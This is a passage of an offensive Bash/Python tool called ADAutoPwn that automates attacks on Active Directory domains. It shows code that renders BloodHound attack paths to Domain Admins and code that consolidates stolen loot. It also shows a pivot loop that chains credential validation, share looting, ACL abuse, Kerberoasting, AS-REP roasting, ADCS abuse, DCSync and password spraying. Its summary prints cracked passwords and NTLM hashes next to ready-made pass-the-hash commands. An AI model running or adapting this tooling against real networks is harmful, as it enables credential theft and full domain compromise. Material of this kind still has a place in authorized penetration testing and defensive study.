if DOM in ("domain.local","domain",""):
    for _n,_d in files.items():
        if "domains" in _n.lower():
            _data=_d.get("data") if isinstance(_d,dict) else _d
            if isinstance(_data,list) and _data:
                _p=_data[0].get("Properties") or {}
                if _p.get("name"): DOM=_p["name"]; break

def all_records():
    for name, doc in files.items():
        data = doc.get("data") if isinstance(doc, dict) else doc
        meta = doc.get("meta",{}) if isinstance(doc, dict) else {}
        t = (meta or {}).get("type","")
        if isinstance(data, list):
            for r in data: yield t, r

nodes = {}
edges = []
HVNAME = ["DOMAIN ADMINS","ENTERPRISE ADMINS","ADMINISTRATORS","DOMAIN CONTROLLERS",
          "SCHEMA ADMINS","ACCOUNT OPERATORS","BACKUP OPERATORS","KEY ADMINS",
          "ENTERPRISE KEY ADMINS","SERVER OPERATORS","PRINT OPERATORS","KRBTGT"]

def add_node(sid, label, ntype, hv=False):
    if not sid: return
    n = nodes.get(sid)
    if n is None:
        nodes[sid] = {"id":sid,"label":label or sid,"type":ntype or "Base","hv":bool(hv),"owned":False}
    else:
        if label and n["label"]==sid: n["label"]=label
        if hv: n["hv"]=True
        if ntype and n["type"]=="Base": n["type"]=ntype

def P(r): return r.get("Properties") or {}

TYPEMAP = {"users":"User","groups":"Group","computers":"Computer","domains":"Domain",
           "gpos":"GPO","ous":"OU","containers":"Container"}

for t, r in all_records():
    nt = TYPEMAP.get(t,"Base")
    p = P(r); sid = r.get("ObjectIdentifier")
    name = p.get("name") or p.get("distinguishedname") or sid
    hv = bool(p.get("highvalue", False))
    if nt=="Group" and any(k in (name or "").upper() for k in HVNAME): hv=True
    if nt=="Domain": hv=True
    add_node(sid, name, nt, hv)

def ensure(sid, t="Base"):
    if sid and sid not in nodes:
        add_node(sid, sid, TYPEMAP.get((t or "").lower()+"s", t if t else "Base"))

for t, r in all_records():
    sid = r.get("ObjectIdentifier")
    if not sid: continue
    for ace in (r.get("Aces") or []):
        ps = ace.get("PrincipalSID"); rn = ace.get("RightName") or "ACE"
        if not ps: continue
        ensure(ps, ace.get("PrincipalType","Base")); edges.append([ps, sid, rn])
    for m in (r.get("Members") or []):
        mid = m.get("ObjectIdentifier")
        if mid: ensure(mid, m.get("ObjectType","Base")); edges.append([mid, sid, "MemberOf"])
    for a in (r.get("AllowedToAct") or []):
        aid = a.get("ObjectIdentifier") if isinstance(a,dict) else a
        if aid: ensure(aid); edges.append([aid, sid, "AllowedToAct"])
    la = r.get("LocalAdmins") or {}
    res = la.get("Results") if isinstance(la, dict) else la
    for a in (res or []):
        aid = a.get("ObjectIdentifier") if isinstance(a,dict) else a
        if aid: ensure(aid); edges.append([aid, sid, "AdminTo"])
    for a in (r.get("AllowedToDelegate") or []):
        aid = a.get("ObjectIdentifier") if isinstance(a,dict) else a
        if aid: ensure(aid); edges.append([sid, aid, "AllowedToDelegate"])

# ---- owned (compromised) nodes from valid_creds_map.txt -------------------
owned = set()
if OWNED and os.path.exists(OWNED):
    for line in open(OWNED, errors="ignore"):
        tok = line.strip().split()
        if tok:
            u = tok[0].split(":")[0].split("@")[0].upper()
            if u: owned.add(u)
name2sid = {}
for sid,n in nodes.items():
    lbl=(n["label"] or "").upper()
    name2sid.setdefault(lbl, sid); name2sid.setdefault(lbl.split("@")[0], sid)
for u in owned:
    for cand in (u, u+"@"+DOM.upper()):
        if cand in name2sid: nodes[name2sid[cand]]["owned"]=True; break

# ---- attack paths: BFS owned → high-value, mark edges ---------------------
adj = defaultdict(list)
for i,(s,t,l) in enumerate(edges): adj[s].append((t,i))
hv = {sid for sid,n in nodes.items() if n["hv"]}
onpath_e=set(); onpath_n=set()
def bfs(start):
    if start not in nodes: return
    prev={start:None}; pe={}; q=deque([start]); tgt=None
    while q:
        u=q.popleft()
        if u in hv and u!=start: tgt=u; break
        for v,ei in adj.get(u,[]):
            if v not in prev: prev[v]=u; pe[v]=ei; q.append(v)
    if tgt:
        nd=tgt
        while prev[nd] is not None:
            onpath_e.add(pe[nd]); onpath_n.add(nd); nd=prev[nd]
        onpath_n.add(start)
owned_sids=[sid for sid,n in nodes.items() if n["owned"]]
for s in owned_sids: bfs(s)
if not onpath_e:
    for i,(s,t,l) in enumerate(edges):
        if t in hv and l!="MemberOf": onpath_e.add(i); onpath_n.add(s); onpath_n.add(t)

# ---- prune for readability (keep all if small) ----------------------------
keep=set(onpath_n)|hv|set(owned_sids)
inb=defaultdict(list)
for s,t,l in edges: inb[t].append(s)
for sid in list(keep):
    for v,ei in adj.get(sid,[]): keep.add(v)
    for v in inb.get(sid,[]): keep.add(v)
if len(nodes)<=450: keep=set(nodes.keys())

idx={}; out_nodes=[]
for sid in keep:
    n=nodes.get(sid)
    if not n: continue
    idx[sid]=len(out_nodes)
    out_nodes.append({"id":sid,"label":n["label"],"type":n["type"],
                      "hv":n["hv"],"owned":n["owned"],"p":sid in onpath_n})
seen=set(); out_edges=[]
for i,(s,t,l) in enumerate(edges):
    if s in idx and t in idx:
        k=(s,t,l)
        if k in seen: continue
        seen.add(k)
        out_edges.append({"s":idx[s],"t":idx[t],"l":l,"p":i in onpath_e})

meta = "%d nodes · %d edges · %s%s" % (len(out_nodes), len(out_edges), DOM,
        "" if files else "  (no BloodHound data)")
write_html({"nodes":out_nodes,"edges":out_edges}, meta)
print("graph.html: %d nodes / %d edges" % (len(out_nodes), len(out_edges)))
PYEOF
}

# Open a file in the user's browser, but only when a desktop session exists
# (silently no-ops over SSH/headless so it never blocks an unattended run).
open_in_browser() {
    local f="$1"; [[ "$NO_OPEN" == "1" || "$STEALTH" == "1" ]] && return
    [[ -z "$DISPLAY" && -z "$WAYLAND_DISPLAY" ]] && return
    if   have xdg-open; then ( xdg-open "$f"  >/dev/null 2>&1 & )
    elif have firefox;  then ( firefox  "$f"  >/dev/null 2>&1 & )
    elif have google-chrome; then ( google-chrome "$f" >/dev/null 2>&1 & )
    else return; fi
    info "Opened graph.html in your browser"
}

phase_bloodhound_graph() {
    [[ "$DO_BLOODHOUND" != "1" ]] && return
    have python3 || { warn "python3 unavailable → skipping graph.html"; return; }
    local zip; zip=$(ls -t "$OUTDIR"/bloodhound/*.zip 2>/dev/null | head -1)
    local html="$OUTDIR/graph.html"
    subsection "Rendering interactive attack graph (graph.html)"
    BH_ZIP="$zip" BH_HTML="$html" OWNED_FILE="$OUTDIR/valid_creds_map.txt" \
    GDOMAIN="${DOMAIN:-domain.local}" GDC="${DC_FQDN:-$DC_IP}" GDCIP="${DC_IP:-${DC_FQDN}}" render_graph_py
    if [[ -s "$html" ]]; then
        loot "Interactive attack graph → graph.html (open in a browser — offline)"
        open_in_browser "$html"
    else
        warn "Could not generate graph.html"
    fi
}

# Standalone: turn a BloodHound zip straight into the interactive graph and open
# it — no scan, no creds. `adautopwn.sh --graph data.zip [-d domain] [-o dir]`
graph_only_mode() {
    local zip="$GRAPH_ZIP"
    have python3 || die "python3 is required to render the graph"
    [[ -f "$zip" ]] || die "BloodHound zip not found: $zip"
    zip="$(cd "$(dirname "$zip")" && pwd)/$(basename "$zip")"
    local outdir html
    outdir="${OUTDIR:-$(dirname "$zip")}"; mkdir -p "$outdir"
    html="$outdir/graph.html"
    section "BLOODHOUND → INTERACTIVE GRAPH (standalone)"
    info "Source zip: ${C_BOLD}$zip${C_RESET}"
    BH_ZIP="$zip" BH_HTML="$html" OWNED_FILE="${OWNED_FILE:-}" \
    GDOMAIN="${DOMAIN:-domain.local}" GDC="${DC_FQDN:-${DC_IP:-domain.local}}" GDCIP="${DC_IP:-${DC_FQDN}}" render_graph_py | sed 's/^/  /'
    if [[ -s "$html" ]]; then
        loot "Interactive attack graph → ${C_BOLD}$html${C_RESET}"
        open_in_browser "$html"
    else
        die "Could not generate the graph from $zip"
    fi
}

# ===========================================================================
#  LOOT CONSOLIDATION  —  fewer files at the top, intermediates tucked away
#  Runs once at the very end. High-value + resume-critical files stay at root;
#  everything else is grouped into enum/ · secrets/ · raw/. Empty files pruned.
# ===========================================================================
finalize_loot() {
    [[ -z "$OUTDIR" || ! -d "$OUTDIR" ]] && return
    section "LOOT CONSOLIDATION"

    # 1) prune zero-byte files at top level (keep the log even if empty)
    find "$OUTDIR" -maxdepth 1 -type f -empty ! -name 'adautopwn.log' -delete 2>/dev/null

    # 2) group intermediates; resume-critical + trophies stay at root
    mkdir -p "$OUTDIR/enum" "$OUTDIR/secrets" "$OUTDIR/raw"
    _mv_loot() { local dst="$1"; shift; local f
        for f in "$@"; do [[ -e "$OUTDIR/$f" ]] && mv -f "$OUTDIR/$f" "$OUTDIR/$dst/" 2>/dev/null; done; }

    _mv_loot enum users_enum.txt users_rpc.txt users_ridbrute.txt users_variants.txt \
        users_variants_valid.txt domain_users.txt domain_groups.txt user_descriptions.txt \
        pass_policy.txt enum4linux.json nmap_dc.txt domain_wordlist.txt shares_auth.txt \
        _userenum_seed.txt _asrep_seed.txt

    _mv_loot secrets laps.txt gmsa.txt gpp.txt dpapi.txt winrm_users.txt share_secrets.txt \
        coerce.txt relay_ldap.txt trusts.txt certipy_find.txt disabled_accounts.txt \
        deleted_objects.txt disabled_or_locked.txt must_change_password.txt

    local f
    for f in "$OUTDIR"/acl_writable_*.txt;          do [[ -e "$f" ]] && mv -f "$f" "$OUTDIR/secrets/" 2>/dev/null; done
    for f in "$OUTDIR"/filehash_*.txt "$OUTDIR"/content_*.txt "$OUTDIR"/decrypted_* "$OUTDIR"/cracked_files.txt; do
        [[ -e "$f" ]] && mv -f "$f" "$OUTDIR/raw/" 2>/dev/null; done

    # 3) drop subdirs that ended up empty
    rmdir "$OUTDIR"/enum "$OUTDIR"/secrets "$OUTDIR"/raw 2>/dev/null
    ok "Loot consolidated → trophies at root · details in enum/ · secrets/ · raw/"
}

# ===========================================================================
#  CONSOLIDATED REPORT  —  one human-readable index of the whole engagement
# ===========================================================================
gen_report() {
    [[ -z "$OUTDIR" ]] && return
    local r="$OUTDIR/report.md" o="$OUTDIR"
    # grep -c always prints a single number (0 when no match); capturing it
    # avoids the "0\n0" doubling you get from `&& grep || echo 0`.
    _grepc(){ local n; n=$(grep -cE "$1" "$2" 2>/dev/null); echo "${n:-0}"; }
    local n_users n_asrep n_kerb n_ntlm n_crack
    n_users=$( [[ -s "$o/users_all.txt" ]] && wc -l <"$o/users_all.txt" || echo 0 )
    n_asrep=$(_grepc krb5asrep "$o/asrep_hashes.txt")
    n_kerb=$( _grepc krb5tgs   "$o/kerberoast_hashes.txt")
    n_ntlm=$( _grepc ':::'     "$o/secretsdump.txt")
    n_crack=$( [[ -s "$o/cracked_passwords.txt" ]] && wc -l <"$o/cracked_passwords.txt" || echo 0 )

    {
        echo "# ADAutoPwn — Engagement Report"
        echo
        echo "- **Target:** \`$DC_IP\` (${DC_FQDN:-?})"
        echo "- **Domain:** ${DOMAIN:-?}"
        echo "- **Auth mode:** $([[ $KERBEROS == 1 ]] && echo Kerberos || echo NTLM)"
        echo "- **Authenticated as:** $([[ $HAVE_AUTH == 1 ]] && echo "\`$USER\` ✅" || echo "—")"
        echo "- **Generated:** $(date '+%Y-%m-%d %H:%M:%S')"
        echo
        echo "## At a glance"
        echo
        echo "| Metric | Count |"
        echo "|---|---|"
        echo "| Users enumerated | $n_users |"
        echo "| AS-REP hashes | $n_asrep |"
        echo "| Kerberoast hashes | $n_kerb |"
        echo "| NTLM hashes (DCSync) | $n_ntlm |"
        echo "| Cracked passwords | $n_crack |"
        echo
        echo "## Attack graph"
        echo
        echo "Open [\`graph.html\`](graph.html) in a browser — interactive, offline, highlights paths to Domain Admins/DC."
        echo

        if [[ -s "$o/valid_creds_map.txt" ]]; then
            echo "## Working identities (provenance)"; echo
            echo '```'; sort -u "$o/valid_creds_map.txt"; echo '```'; echo
        fi
        if [[ -s "$o/credential_map.txt" ]]; then
            echo "## Recovered secrets"; echo
            echo '```'; sort -u "$o/credential_map.txt"; echo '```'; echo
        fi
        if grep -qiE 'ESC[0-9]+' "$o/certipy_find.txt" 2>/dev/null; then
            echo "## ⚠ Vulnerable ADCS templates"; echo
            echo '```'; grep -iE 'Template Name|ESC[0-9]+' "$o/certipy_find.txt" | head -40; echo '```'; echo
        fi
        local acl; acl=$(ls "$o"/acl_writable_*.txt 2>/dev/null | head -1)
        if [[ -n "$acl" ]]; then
            echo "## Exploitable ACLs"; echo
            echo "Writable rights detected — see \`secrets/$(basename "$acl")\`. Re-run with \`--abuse\` to weaponize."; echo
        fi
        # Only real trust results have "attr: value" lines; skip bloodyAD's
        # NoResultError dump (which echoes the filter and trips a naive grep).
        if [[ -s "$o/trusts.txt" ]] && grep -qE 'trustPartner: *[^ ]|trustDirection: *[0-9]' "$o/trusts.txt" 2>/dev/null; then
            echo "## Domain trusts"; echo
            echo '```'; grep -E 'trustPartner: |trustDirection: |trustType: |flatName: ' "$o/trusts.txt" | head -20; echo '```'; echo
        fi

        echo "## Loot layout"; echo
        echo "- Root: trophies + resume files (\`users_all.txt\`, \`found_passwords.txt\`, hashes, \`*.ccache\`, \`report.md\`, \`graph.html\`)"
        echo "- \`enum/\` — enumeration intermediates (users, groups, policy, nmap, wordlist)"
        echo "- \`secrets/\` — LAPS/gMSA/GPP/DPAPI, ACL dumps, trusts, ADCS, coercion"
        echo "- \`shares/\` — looted share contents · \`bloodhound/\` — collection zip · \`raw/\` — misc"
        echo
        echo "_Full live log: \`adautopwn.log\`_"
    } >"$r"
    ok "Consolidated report → report.md"
}

# ===========================================================================
#  FINAL SUMMARY
# ===========================================================================
final_summary() {
    section "OPERATION SUMMARY"
    echo -e "  ${C_BOLD}Target:${C_RESET}        $DC_IP  (${DC_FQDN:-?})"
    echo -e "  ${C_BOLD}Domain:${C_RESET}        ${DOMAIN:-?}"
    echo -e "  ${C_BOLD}Auth mode:${C_RESET}     $([[ $KERBEROS == 1 ]] && echo Kerberos || echo NTLM)"
    echo -e "  ${C_BOLD}Authenticated:${C_RESET} $([[ $HAVE_AUTH == 1 ]] && echo "${C_GREEN}YES ($USER)${C_RESET}" || echo "${C_YELLOW}NO${C_RESET}")"
    echo -e "  ${C_BOLD}Loot dir:${C_RESET}      $OUTDIR"
    hr
    [[ -s "$OUTDIR/users_all.txt" ]]         && loot "Enumerated users:    $(wc -l <"$OUTDIR/users_all.txt")"
    [[ -s "$OUTDIR/asrep_hashes.txt" ]]      && loot "AS-REP hashes:       $(grep -c krb5asrep "$OUTDIR/asrep_hashes.txt")"
    [[ -s "$OUTDIR/kerberoast_hashes.txt" ]] && loot "Kerberoast hashes:   $(grep -c krb5tgs "$OUTDIR/kerberoast_hashes.txt" 2>/dev/null)"
    [[ -s "$OUTDIR/secretsdump.txt" ]]       && loot "NTLM hashes (DCSync):$(grep -cE ':::' "$OUTDIR/secretsdump.txt")"
    [[ -s "$OUTDIR/cracked_passwords.txt" ]] && loot "Cracked passwords:   $(wc -l <"$OUTDIR/cracked_passwords.txt")"
    grep -qiE 'ESC[0-9]+' "$OUTDIR/certipy_find.txt" 2>/dev/null && loot "Vulnerable ADCS:     YES (see certipy_find.txt)"

    # Credential provenance map — where every secret/identity came from
    if [[ -s "$OUTDIR/credential_map.txt" || -s "$OUTDIR/valid_creds_map.txt" ]]; then
        subsection "Credential map (what we got & where it came from)"
        if [[ -s "$OUTDIR/valid_creds_map.txt" ]]; then
            echo -e "    ${C_BOLD}Working identities:${C_RESET}"
            sort -u "$OUTDIR/valid_creds_map.txt" | while IFS= read -r l; do echo -e "      ${C_GREEN}$l${C_RESET}"; done
        fi
        if [[ -s "$OUTDIR/credential_map.txt" ]]; then
            echo -e "    ${C_BOLD}Recovered passwords:${C_RESET}"
            sort -u "$OUTDIR/credential_map.txt" | while IFS= read -r l; do echo -e "      ${C_MAGENTA}$l${C_RESET}"; done
        fi
        ok "Full map saved → credential_map.txt / valid_creds_map.txt"
    fi

    # Compromised principals — every identity we took control of, with the groups
    # it belongs to. Admins are crowned and shown bright; everyone else is plain.
    if [[ ${#OWNED_GROUPS[@]} -gt 0 ]]; then
        section "COMPROMISED PRINCIPALS · accounts under our control"
        local _u
        # admins first (bright gold + 👑), then everyone else (plain green), sorted
        while IFS= read -r _u; do [[ -z "$_u" ]] && continue
            detail "      ${C_YELLOW}${C_BOLD}👑 ${_u}${C_RESET}  ${C_RED}${C_BOLD}[ADMIN]${C_RESET}  ${C_DIM}${OWNED_GROUPS[$_u]}${C_RESET}"
        done < <(for k in "${!OWNED_ADMIN[@]}"; do printf '%s\n' "$k"; done | sort)
        while IFS= read -r _u; do [[ -z "$_u" ]] && continue
            detail "      ${C_GREEN}${_u}${C_RESET}  ${C_DIM}${OWNED_GROUPS[$_u]}${C_RESET}"
        done < <(for k in "${!OWNED_GROUPS[@]}"; do [[ -z "${OWNED_ADMIN[$k]:-}" ]] && printf '%s\n' "$k"; done | sort)
        ok "${#OWNED_GROUPS[@]} compromised (${#OWNED_ADMIN[@]} admin) → owned_principals.txt"
    fi

    # ----- FULL HARVEST: everything recovered, in detail + colour -----------
    local dd=""
    [[ -s "$OUTDIR/secretsdump.txt" ]] && grep -qE ':::' "$OUTDIR/secretsdump.txt" 2>/dev/null && dd="$OUTDIR/secretsdump.txt"
    [[ -z "$dd" && -s "$OUTDIR/ntds_local.txt" ]] && grep -qE ':::' "$OUTDIR/ntds_local.txt" 2>/dev/null && dd="$OUTDIR/ntds_local.txt"

    if [[ -s "$OUTDIR/found_passwords.txt" || -s "$OUTDIR/asrep_hashes.txt" || -s "$OUTDIR/kerberoast_hashes.txt" || -n "$dd" ]]; then
        section "FULL HARVEST · EVERYTHING RECOVERED"

        if [[ -s "$OUTDIR/found_passwords.txt" ]]; then
            detail "  ${C_BOLD}${C_GREEN}» Plaintext passwords${C_RESET} ${C_DIM}($(sort -u "$OUTDIR/found_passwords.txt" | grep -c . ) unique)${C_RESET}"
            while IFS= read -r p; do
                [[ -z "$p" ]] && continue
                local who; who=$(grep -F ":$p" "$OUTDIR/valid_creds_map.txt" 2>/dev/null | head -1 | awk '{print $1}')
                if [[ -n "$who" ]]; then detail "      ${C_GREEN}${C_BOLD}${who%%:*}${C_RESET} ${C_DIM}:${C_RESET} ${C_GREEN}$p${C_RESET}"
                else detail "      ${C_GREEN}$p${C_RESET}"; fi
            done < <(sort -u "$OUTDIR/found_passwords.txt")
        fi

        if [[ -s "$OUTDIR/asrep_hashes.txt" ]] && grep -qi krb5asrep "$OUTDIR/asrep_hashes.txt"; then
            detail "  ${C_BOLD}${C_YELLOW}» AS-REP roastable${C_RESET} ${C_DIM}($(grep -c krb5asrep "$OUTDIR/asrep_hashes.txt") — hashcat -m 18200)${C_RESET}"
            while IFS= read -r h; do local w; w=$(echo "$h" | grep -oiP '\$krb5asrep\$[0-9]+\$\K[^@:]+')
                detail "      ${C_CYAN}${w:-?}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done < <(grep -i krb5asrep "$OUTDIR/asrep_hashes.txt")
        fi

        if [[ -s "$OUTDIR/kerberoast_hashes.txt" ]] && grep -qi krb5tgs "$OUTDIR/kerberoast_hashes.txt"; then
            detail "  ${C_BOLD}${C_YELLOW}» Kerberoastable${C_RESET} ${C_DIM}($(grep -c krb5tgs "$OUTDIR/kerberoast_hashes.txt") — hashcat -m 13100)${C_RESET}"
            while IFS= read -r h; do local w; w=$(echo "$h" | grep -oiP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+')
                detail "      ${C_CYAN}${w:-?}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done < <(grep -i krb5tgs "$OUTDIR/kerberoast_hashes.txt")
        fi

        if [[ -n "$dd" ]]; then
            detail "  ${C_BOLD}${C_RED}» DOMAIN NTLM DUMP${C_RESET} ${C_DIM}($(grep -cE ':::' "$dd") accounts — Pass-the-Hash ready)${C_RESET}"
            # high-value first (Administrator, krbtgt), then the rest
            while IFS= read -r line; do
                local u nt lc; u=$(echo "$line" | cut -d: -f1); nt=$(echo "$line" | cut -d: -f4); lc="${u,,}"
                case "$lc" in
                    *administrator|*krbtgt|*'$') detail "      ${C_RED}${C_BOLD}${u}${C_RESET} ${C_DIM}:${C_RESET} ${C_RED}${nt}${C_RESET}" ;;
                    *) detail "      ${C_CYAN}${u}${C_RESET} ${C_DIM}:${C_RESET} ${C_MAGENTA}${nt}${C_RESET}" ;;
                esac
            done < <(grep -E ':::' "$dd" | grep -iE '(administrator|krbtgt):' ; grep -E ':::' "$dd" | grep -ivE '(administrator|krbtgt):')
            local ah; ah=$(grep -iE '^[^:]*administrator:' "$dd" | head -1 | cut -d: -f4)
            [[ -n "$ah" ]] && detail "      ${C_BOLD}${C_RED}↳ PtH:${C_RESET} ${C_DIM}impacket-secretsdump -hashes :$ah Administrator@$DC_IP  ·  evil-winrm -i $DC_IP -u Administrator -H $ah${C_RESET}"
        fi
        echo
    fi

    # Build the human report + interactive graph, THEN tidy the loot dir
    # (gen_report/graph read files while they're still at the root).
    gen_report
    phase_bloodhound_graph
    finalize_loot

    echo
    [[ -s "$OUTDIR/report.md" ]] && loot "Report → report.md   ·   Attack graph → graph.html"
    ok "Done. Full log: $LOGFILE"
    echo -e "${C_GREY}    ════════════════════════════════════════════════════════════${C_RESET}"
    echo -e "${C_GREY}     Thanks for using ADAutoPwn · by ${C_RESET}${C_GREEN}${C_BOLD}${AUTHOR}${C_RESET}"
    echo -e "${C_GREY}    ════════════════════════════════════════════════════════════${C_RESET}"
}

_atexit() { [[ -n "$SUDO_KEEPALIVE_PID" ]] && kill "$SUDO_KEEPALIVE_PID" 2>/dev/null; }
trap _atexit EXIT INT TERM

# ===========================================================================
#  PIVOTING ENGINE  —  assess each credential, recurse on what it unlocks
# ===========================================================================
BH_DONE=0

assess_current_credential() {
    SEEN_CREDS["${USER,,}"]=1
    HAVE_AUTH=0; KERB_TICKET=""; unset KRB5CCNAME

    section "ASSESSING IDENTITY · ${USER}"
    info "Credential: ${C_BOLD}${USER}${C_RESET} $( [[ -n "$HASH" ]] && echo '(NT hash / PtH)' || echo '(password)')"

    phase_validate_creds
    [[ "$HAVE_AUTH" != "1" ]] && { warn "Skipping further phases for $USER (no valid auth)"; return; }

    record_owned_identity        # log this compromised identity + its groups (for the summary)
    phase_auth_enum;    jitter
    phase_user_variants; jitter
    phase_share_loot;   jitter
    phase_secrets;      jitter
    phase_winrm_dpapi;  jitter
    phase_acl;          jitter
    phase_recycle_disabled; jitter
    phase_relay;        jitter
    phase_trusts;       jitter
    phase_asreproast;   jitter
    phase_kerberoast;   jitter
    phase_adcs;         jitter
    if [[ "$BH_DONE" == "0" ]]; then phase_bloodhound; BH_DONE=1; jitter; fi
    phase_dcsync;       jitter
    # Spray everything we recovered this round across all users → new pivots
    phase_password_spray
}

process_queue() {
    local entry u p h
    while [[ ${#CRED_QUEUE[@]} -gt 0 ]]; do
        entry="${CRED_QUEUE[0]}"
        CRED_QUEUE=("${CRED_QUEUE[@]:1}")        # dequeue (FIFO)
        IFS='|' read -r u p h <<<"$entry"
        [[ -n "${SEEN_CREDS[${u,,}]:-}" ]] && continue
        USER="$u"; PASS="$p"; HASH="$h"
        assess_current_credential
    done
}

# ===========================================================================
#  USAGE
# ===========================================================================
usage() {
    banner
cat <<EOF

${C_CYAN}${C_BOLD}USAGE${C_RESET}
  $0 -t <DC_IP> [-d <domain>] [-u <user>] [-p <pass> | -H <nt_hash>] [options]

${C_CYAN}${C_BOLD}REQUIRED${C_RESET}
  ${C_GREEN}-t${C_RESET} <ip>        Domain Controller IP address

${C_CYAN}${C_BOLD}CREDENTIALS${C_RESET} ${C_DIM}(optional — without any, every unauthenticated phase still runs)${C_RESET}
  ${C_GREEN}-d${C_RESET} <domain>    Domain FQDN (e.g. corp.local). Auto-detected via SMB if omitted
  ${C_GREEN}-u${C_RESET} <user>      Domain username
  ${C_GREEN}-p${C_RESET} <pass>      Cleartext password
  ${C_GREEN}-H${C_RESET} <hash>      NT hash for pass-the-hash (LM:NT or just NT)

${C_CYAN}${C_BOLD}OPTIONS${C_RESET}
  ${C_GREEN}-o${C_RESET} <dir>       Output/loot directory          ${C_DIM}(default: ./loot_<domain>_<date>)${C_RESET}
  ${C_GREEN}-w${C_RESET} <wordlist>  Wordlist for cracking          ${C_DIM}(default: $WORDLIST)${C_RESET}
  ${C_GREEN}--sudo-pass${C_RESET} <p> Sudo password for unattended /etc/hosts + time sync
                ${C_DIM}(or export SUDO_PASS=…). Needed when running headless${C_RESET}
  ${C_GREEN}--creds-file${C_RESET} <f> Feed extra credentials to continue from (lines ${C_DIM}user:password${C_RESET}
                or ${C_DIM}user:nthash${C_RESET}). Each one is assessed and pivots recursively
  ${C_GREEN}--users-file${C_RESET} <f> Merge an external username list (for spray / AS-REP / variants)

  ${C_DIM}── toggles (no value) ──${C_RESET}
  ${C_GREEN}--no-crack${C_RESET}     Disable hash cracking ${C_DIM}(cracking is ON by default)${C_RESET}
  ${C_GREEN}--spray${C_RESET}        Also spray the domain-focused wordlist ONLINE ${C_YELLOW}(account-lockout risk)${C_RESET}
  ${C_GREEN}--abuse${C_RESET}        ${C_BOLD}Actively exploit${C_RESET} ACLs: group adds, ForceChangePassword,
                WriteSPN→Kerberoast, ${C_BOLD}Shadow Credentials${C_RESET}, ${C_BOLD}RBCD${C_RESET}, restore/enable
                accounts. Off by default → ACLs only reported. Rollback-tracked
  ${C_GREEN}--cleanup${C_RESET}      Revert every change this tool recorded, then exit. Point ${C_GREEN}-o${C_RESET} at the
                original loot dir so it can read its rollback.log
  ${C_GREEN}--stealth${C_RESET}      OPSEC mode: skip noisy techniques (enum4linux, etc.) + add jitter
  ${C_GREEN}--ntlm${C_RESET}         Force NTLM auth ${C_DIM}(default is Kerberos-first)${C_RESET}
  ${C_GREEN}--no-bh${C_RESET}        Skip BloodHound collection
  ${C_GREEN}--no-open${C_RESET}      Don't auto-open graph.html in a browser
  ${C_GREEN}-y, --yes${C_RESET}      Assume "yes" to all prompts — fully unattended run
  ${C_GREEN}--no-color${C_RESET}     Disable colored output (also honored via NO_COLOR=1)
  ${C_GREEN}-h, --help${C_RESET}     Show this help

${C_CYAN}${C_BOLD}STANDALONE GRAPH${C_RESET} ${C_DIM}(no scan — just visualize a BloodHound zip)${C_RESET}
  ${C_GREEN}--graph${C_RESET} <zip>   Render any BloodHound .zip into the interactive ${C_BOLD}graph.html${C_RESET}
                and open it. Domain auto-detected from the data
  ${C_GREEN}--owned${C_RESET} <file>  Mark these principals (one per line) as compromised in the graph
  ${C_DIM}e.g.  $0 --graph ~/Downloads/bloodhound.zip${C_RESET}

${C_CYAN}${C_BOLD}WHAT IT DOES${C_RESET} ${C_DIM}(phases run automatically, gated by what your access unlocks)${C_RESET}
  ${C_PURPLE}0${C_RESET}  Discovery      nmap of AD ports, SMB fingerprint → hostname/domain/FQDN
  ${C_PURPLE}1${C_RESET}  Host & time    auto /etc/hosts entry + clock sync with DC (Kerberos prereq)
  ${C_PURPLE}2${C_RESET}  Unauth enum    null/guest sessions, anon shares, RID brute, rpcclient,
                    LDAP anon bind, enum4linux-ng, kerbrute userenum
  ${C_PURPLE}3${C_RESET}  AS-REP roast   GetNPUsers against discovered users (no creds needed)
  ${C_PURPLE}4${C_RESET}  Validate+TGT   verify creds, request & cache a Kerberos TGT (reused after)
  ${C_PURPLE}5${C_RESET}  Auth enum      users, groups, pass policy, descriptions, shares, MAQ
  ${C_PURPLE}+${C_RESET}  Secrets        LAPS & gMSA reads (auto-pivot on recovered hashes)
  ${C_PURPLE}+${C_RESET}  ACL analysis   exploitable rights (GenericAll/WriteDACL/ForceChangePwd/…),
                    optional abuse with --abuse
  ${C_PURPLE}+${C_RESET}  Trusts         domain/forest trusts, foreign principals, cross-forest roast
  ${C_PURPLE}6${C_RESET}  Kerberoast     GetUserSPNs for SPN accounts (+ cross-forest)
  ${C_PURPLE}7${C_RESET}  ADCS           certipy scan for ESC1..ESC16 vulnerable templates
  ${C_PURPLE}8${C_RESET}  BloodHound     full collection (All) → importable .zip ${C_BOLD}+ interactive graph.html${C_RESET}
  ${C_PURPLE}9${C_RESET}  DCSync         secretsdump -just-dc when privileges allow → all NTLM hashes
  ${C_PURPLE}+${C_RESET}  Report         consolidated ${C_BOLD}report.md${C_RESET} + tidy loot (enum/ · secrets/ · raw/)
  ${C_PURPLE}∞${C_RESET}  Pivot loop     every new identity (cracked / reset / LAPS / gMSA / ESC1) is
                    re-fed and the whole chain repeats until nothing new appears

${C_CYAN}${C_BOLD}EXAMPLES${C_RESET}
  ${C_DIM}# Zero-credential recon (users, AS-REP, anon shares, trusts)${C_RESET}
  $0 -t 10.10.10.10

  ${C_DIM}# Full authenticated, auto-cracking, fully unattended (Kerberos default)${C_RESET}
  $0 -t 10.10.10.10 -d corp.local -u jdoe -p 'P@ssw0rd' --crack -y

  ${C_DIM}# Go loud: also abuse ACLs (add to groups / reset passwords) with rollback${C_RESET}
  $0 -t 10.10.10.10 -d corp.local -u jdoe -p 'P@ssw0rd' --crack --abuse

  ${C_DIM}# Pass-the-hash straight through to DCSync${C_RESET}
  $0 -t 10.10.10.10 -d corp.local -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0

  ${C_DIM}# Quiet engagement${C_RESET}
  $0 -t 10.10.10.10 -d corp.local -u jdoe -p 'P@ssw0rd' --stealth

  ${C_DIM}# Clean up after yourself (revert group adds, etc.)${C_RESET}
  $0 -t 10.10.10.10 --cleanup -o loot_corp.local_20260607_2210

${C_CYAN}${C_BOLD}LOOT LAYOUT${C_RESET} ${C_DIM}(tidied at the end — trophies on top, the rest grouped)${C_RESET}
  loot_<dom>_<date>/
   ├─ ${C_BOLD}report.md${C_RESET}        consolidated, human-readable engagement report
   ├─ ${C_BOLD}graph.html${C_RESET}       interactive offline attack graph (auto-opens)
   ├─ users_all.txt · found_passwords.txt · credential_map.txt · *.ccache
